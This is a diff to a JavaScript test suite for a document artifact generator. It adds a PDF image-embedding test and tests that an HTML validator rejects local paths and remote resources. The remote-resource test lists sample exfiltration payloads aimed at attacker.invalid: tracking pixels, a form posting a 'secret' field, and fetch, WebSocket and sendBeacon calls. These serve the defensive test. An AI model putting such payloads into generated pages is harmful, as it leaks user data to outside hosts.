@@ -8,6 +8,8 @@ import fs from 'node:fs'
 import os from 'node:os'
 import path from 'node:path'
 import JSZip from 'jszip'
+import { PDFDocument, PDFName } from 'pdf-lib'
+import sharp from 'sharp'
 
 // 用临时目录,跑完清理
 const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'artifact-test-'))
@@ -179,6 +181,37 @@ test('createPdf 真实生成带中文字体和页码的 PDF', async () => {
   assert.ok(result.byteLength > 1_000)
 })
 
+test('createPdf 把授权图片嵌入为真实 PDF image XObject', async () => {
+  const sourcePath = path.join(TMP, 'pdf-source-image.png')
+  await sharp({
+    create: {
+      width: 64,
+      height: 32,
+      channels: 4,
+      background: { r: 12, g: 88, b: 220, alpha: 1 },
+    },
+  }).png().toFile(sourcePath)
+
+  const result = await createPdf({
+    title: '原图转 PDF',
+    images: [{ sourcePath, alt: '实际蓝色图片' }],
+  })
+  const bytes = fs.readFileSync(result.fullPath)
+  const document = await PDFDocument.load(bytes, { updateMetadata: false })
+  const page = document.getPage(0)
+  const xObjects = page.node.Resources().lookup(PDFName.of('XObject'))
+
+  assert.equal(result.type, 'pdf')
+  assert.equal(result.pageCount, 1)
+  assert.equal(result.imageCount, 1)
+  assert.ok(xObjects, 'PDF page resources must contain an XObject dictionary')
+  const imageObjects = xObjects.keys().map((key) => xObjects.lookup(key))
+    .filter((object) => object?.dict?.get(PDFName.of('Subtype'))?.toString() === '/Image')
+  assert.equal(imageObjects.length, 1)
+  assert.equal(imageObjects[0].dict.get(PDFName.of('Width')).asNumber(), 64)
+  assert.equal(imageObjects[0].dict.get(PDFName.of('Height')).asNumber(), 32)
+})
+
 test('createXlsx 真实生成 SpreadsheetML', async () => {
   const result = await createXlsx({
     sheets: [
@@ -242,6 +275,47 @@ test('HTML artifact validation keeps genuine compact webpages valid', () => {
 test('HTML artifact validation rejects unresolved managed attachment URIs', () => {
   const html = '<!doctype html><html><body style="background-image:url(attachment://attachment-123)"><main>Page</main></body></html>'
   assert.throws(() => validateHtmlArtifactSource(html), /unresolved attachment URI/i)
+})
+
+test('HTML artifact validation rejects local disk paths and undeclared managed assets', () => {
+  const localPath = '<!doctype html><html><body><script>const basePath = "E:/果/"</script><main>Gallery</main></body></html>'
+  const fileUri = '<!doctype html><html><body><img src="file:///E:/果/photo.jpg"><main>Gallery</main></body></html>'
+  const managed = '<!doctype html><html><body><img src="gugo-asset://hero"><main>Gallery</main></body></html>'
+
+  assert.throws(() => validateHtmlArtifactSource(localPath), /cannot reference a local disk path/i)
+  assert.throws(() => validateHtmlArtifactSource(fileUri), /cannot reference a local disk path/i)
+  assert.throws(() => validateHtmlArtifactSource(managed), /undeclared managed asset: hero/i)
+  assert.equal(validateHtmlArtifactSource(managed, { assetIds: ['hero'] }), managed)
+  assert.throws(
+    () => validateHtmlArtifactSource(managed, { assetIds: ['hero', 'unused'] }),
+    /declares an unused managed asset: unused/i,
+  )
+})
+
+test('HTML artifact validation rejects remote resources, submissions, and network APIs', () => {
+  const unsafeBodies = [
+    '<img src="https://attacker.invalid/pixel.png">',
+    '<img srcset="//attacker.invalid/a.png 1x, https://attacker.invalid/b.png 2x">',
+    '<style>body{background:url(https://attacker.invalid/pixel.png)}</style>',
+    '<style>@import "//attacker.invalid/theme.css";</style>',
+    '<link rel="preload" href="https://attacker.invalid/font.woff2">',
+    '<form action="https://attacker.invalid/collect"><input name="secret"></form>',
+    '<button formaction="https://attacker.invalid/collect">Send</button>',
+    '<meta http-equiv="refresh" content="0;url=https://attacker.invalid/">',
+    '<script>fetch("https://attacker.invalid/collect")</script>',
+    '<script>new XMLHttpRequest()</script>',
+    '<script>new WebSocket("wss://attacker.invalid/socket")</script>',
+    '<script>new EventSource("https://attacker.invalid/events")</script>',
+    '<script>navigator.sendBeacon("https://attacker.invalid/collect", "x")</script>',
+  ]
+
+  for (const body of unsafeBodies) {
+    const html = `<!doctype html><html><head>${body}</head><body><main>Unsafe</main></body></html>`
+    assert.throws(() => validateHtmlArtifactSource(html), /self-contained/i, body)
+  }
+
+  const managed = '<!doctype html><html><head><style>.hero{background:url(gugo-asset://hero)}</style></head><body><form><img src="gugo-asset://hero"><main>Offline</main></form></body></html>'
+  assert.equal(validateHtmlArtifactSource(managed, { assetIds: ['hero'] }), managed)
 })
 
 test('artifact filenames use the document title and increment duplicate names', async () => {
